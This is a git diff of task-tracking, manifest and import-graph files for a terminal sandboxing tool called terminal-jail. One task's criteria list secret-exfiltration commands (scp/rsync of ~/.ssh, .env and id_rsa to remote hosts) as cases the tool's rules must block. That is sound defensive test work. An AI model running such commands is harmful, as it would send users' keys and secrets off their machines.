@@ -1,0 +1,132 @@
+diff --git a/.coding-hermes/waves/terminal-jail-2026-09-19-19-40-59.json b/.coding-hermes/waves/terminal-jail-2026-09-19-19-40-59.json
+index 65ba75e..4829bef 100644
+--- a/.coding-hermes/waves/terminal-jail-2026-09-19-19-40-59.json
++++ b/.coding-hermes/waves/terminal-jail-2026-09-19-19-40-59.json
+@@ -5,12 +5,22 @@
+   "base_sha": "e7bdc13",
+   "dispatched_at": "2026-09-19T14:52:00-05:00",
+   "wave_budget": 12,
++  "finished_at": "2026-09-20T03:30:00-05:00",
++  "closed_by_tick": "terminal-jail-2026-09-20-03-17-05",
++  "closure_note": "Recovery sweep found this wave ALREADY fully landed by tick #298 (its own tick): all 6 branches merged to main, all 6 board rows status=complete with commit_hash, worktrees removed, merged branches deleted. Recovery therefore reduced to re-verifying the gates on the merged tree, confirming board truth, and closing this manifest. No rework, no fixup workers, no new merges were needed.",
++  "gate_evidence": {
++    "suite": "969 passed, 7 skipped (plugin/, HEAD cd0c732)",
++    "guard_full": "Tier 1 PASS 4/4 (secrets/lint/tests/static_analysis) whole tree",
++    "board_id_guard": "163 rows, 163 unique ids, rc=0",
++    "pidns_probe": "FULL",
++    "fs_isolation_probe": "DEGRADED (AppArmor unprivileged_userns; host-level, not a repo defect)"
++  },
+   "workers": [
+-    {"task_id": "TJ-GAP-067", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-067", "branch": "wt/TJ-GAP-067", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["plugin/terminal_jail/interruptor/decider.py", "plugin/test_interruptor.py"]},
+-    {"task_id": "TJ-GAP-063", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-063", "branch": "wt/TJ-GAP-063", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["specs/cli.md"]},
+-    {"task_id": "DF-TERMINAL-JAIL-9", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-9", "branch": "wt/DF-TERMINAL-JAIL-9", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["README.md", "docs/quickstart.md", "docs/"]},
+-    {"task_id": "DF-TERMINAL-JAIL-18", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-18", "branch": "wt/DF-TERMINAL-JAIL-18", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["scripts/pidns-capability-probe.py", "scripts/fs-isolation-probe.py"]},
+-    {"task_id": "DF-TERMINAL-JAIL-24", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-24", "branch": "wt/DF-TERMINAL-JAIL-24", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["install.sh", "plugin/test_install.py"]},
+-    {"task_id": "TJ-GAP-060", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-060", "branch": "wt/TJ-GAP-060", "model": "glm-5.3-flash", "provider": "zai-glm-default", "scope": ["standalone/terminal-jail", "plugin/test_standalone_cli.py", "specs/threat-model.md"]}
++    {"task_id": "TJ-GAP-067", "branch": "wt/TJ-GAP-067", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-067", "sha": "6394299", "merge": "453dcb6", "judge": "PASS", "final": "merged"},
++    {"task_id": "TJ-GAP-063", "branch": "wt/TJ-GAP-063", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-063", "sha": "5d08996", "merge": "f3806fb", "judge": "PASS", "final": "merged"},
++    {"task_id": "DF-TERMINAL-JAIL-9", "branch": "wt/DF-TERMINAL-JAIL-9", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-9", "sha": "8acff67", "merge": "70fe624", "judge": "PASS", "final": "merged"},
++    {"task_id": "DF-TERMINAL-JAIL-18", "branch": "wt/DF-TERMINAL-JAIL-18", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-18", "sha": "41e39c6", "merge": "045e656", "judge": "PASS", "final": "merged"},
++    {"task_id": "DF-TERMINAL-JAIL-24", "branch": "wt/DF-TERMINAL-JAIL-24", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-24", "sha": "4a34035", "merge": "a0321c7", "judge": "PASS", "final": "merged"},
++    {"task_id": "TJ-GAP-060", "branch": "wt/TJ-GAP-060", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-060", "sha": "249edcc", "merge": "2e3941f", "judge": "PASS 8aaf93d6", "final": "merged"}
+   ]
+ }
+diff --git a/.gitreins/tasks.yaml b/.gitreins/tasks.yaml
+index fbdf1eb..38ae495 100644
+--- a/.gitreins/tasks.yaml
++++ b/.gitreins/tasks.yaml
+@@ -978,3 +978,43 @@ tasks:
+   status: complete
+   created_at: '2026-09-19T19:50:35.539221+00:00'
+   completed_at: '2026-09-19T21:20:59.846215+00:00'
++- id: DF-TERMINAL-JAIL-29
++  title: Scoped secret-source scp/rsync to remote hosts now blocks
++  criteria:
++  - 'Bridge probe with TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR neutralized: scp -r
++    ~/.ssh host:/tmp/, scp ~/.env host:, scp .env host:/x, scp id_rsa host:, rsync
++    /home/kara/.ssh host:/x, rsync -a -e ssh ~/.env host::mod, scp -r ~ host:/x, scp
++    known_hosts host: all return block/builtin-net-remote-tree-copy'
++  - 'Allow controls keep verdicts: scp file.txt host:/srv/file.txt, scp -r ~/proj
++    host:/srv/, rsync -av ~/proj/ host:/srv/proj/, scp -o IdentityFile=~/.ssh/id_rsa
++    file.txt host:/x, scp ~/.sshx host:/x, rsync -a ~/.ssh /tmp/loot/, scp host:.env
++    /tmp/x all return allow with rule_id null'
++  - 'Engine and YAML mirror agree: scripts/yaml-mirror-parity-probe.py prints ALL
++    PROBES PASS with totals 54/54 and the engine pattern equals the mirror pattern
++    for builtin-net-remote-tree-copy'
++  - 'Full suite green on merged main: .venv/bin/python -m pytest plugin -q reports
++    1016 passed, 7 skipped, zero failures'
++  - 'Docs name the new shape: README.md, specs/interruptor.md and docs/rule-catalog.md
++    describe builtin-net-remote-tree-copy as whole-tree OR secret-source and the README/spec
++    verdict tables carry the new block rows and allow rows; CHANGELOG.md has a DF-TERMINAL-JAIL-29
++    section'
++  status: complete
++  created_at: '2026-09-20T10:07:56.624238+00:00'
++  completed_at: '2026-09-20T10:08:54.559214+00:00'
++- id: DF-TERMINAL-JAIL-28
++  title: 'test_rule_packs: refusal-presence not exact stderr line-count'
++  criteria:
++  - TestValidatorRefusals asserts the refusal line is present with documented DF-15
++    WARNING filtered; simulated 2-line stderr passes; unexpected line fails; full
++    suite green on dev host with no env overrides
++  status: complete
++  created_at: '2026-09-20T07:16:59.955110+00:00'
++  completed_at: '2026-09-20T08:22:39.971166+00:00'
++- id: VERSION-002
++  title: Bound test-suite host load - fix worst offender
++  criteria:
++  - Audit table produced; worst offender fixed with bounded waves/shared fixture;
++    before/after wall-clock + spawn numbers measured; no skips/deletions without accounting;
++    full suite green; ruff clean
++  status: in_progress
++  created_at: '2026-09-20T07:17:02.519756+00:00'
+diff --git a/.gitreins/usage.jsonl b/.gitreins/usage.jsonl
+index d3b54e2..38bd626 100644
+--- a/.gitreins/usage.jsonl
++++ b/.gitreins/usage.jsonl
+@@ -51,3 +51,4 @@
+ {"ts": 1789851232.402383, "tokens_in": 424373, "tokens_out": 4127, "cache_read": 0, "cache_write": 0, "step": "tier2"}
+ {"ts": 1789851920.3391752, "tokens_in": 681351, "tokens_out": 5544, "cache_read": 0, "cache_write": 0, "step": "tier2"}
+ {"ts": 1789853265.0303164, "tokens_in": 714875, "tokens_out": 5830, "cache_read": 0, "cache_write": 0, "step": "tier2"}
++{"ts": 1789899112.3773518, "tokens_in": 376702, "tokens_out": 4825, "cache_read": 0, "cache_write": 0, "step": "tier2"}
+diff --git a/.vfs/graph/edges.jsonl b/.vfs/graph/edges.jsonl
+index b9c1393..7742b45 100644
+--- a/.vfs/graph/edges.jsonl
++++ b/.vfs/graph/edges.jsonl
+@@ -140,3 +140,37 @@
+ {"from":"plugin/conftest.py","to":"pkg:sys","rel":"imports","provenance":"ast_exact","confidence":1.0}
+ {"from":"plugin/conftest.py","to":"pkg:pathlib","rel":"imports","provenance":"ast_exact","confidence":1.0}
+ {"from":"plugin/test_seccomp.py","to":"pkg:terminal_jail","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:os","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:subprocess","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:sys","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:pathlib","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:pytest","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:terminal_jail.interruptor","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:terminal_jail.interruptor.allowlist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:terminal_jail.interruptor.rules","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_rule_packs.py","to":"pkg:terminal_jail.interruptor.sandbox","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:re","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:pathlib","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.userns","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.decider","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.decider","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.decider","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.sandbox","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.sandbox","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.sandbox","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.blocklist","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
++{"from":"plugin/test_interruptor.py","to":"pkg:terminal_jail.interruptor.matcher","rel":"imports","provenance":"ast_exact","confidence":1.0}
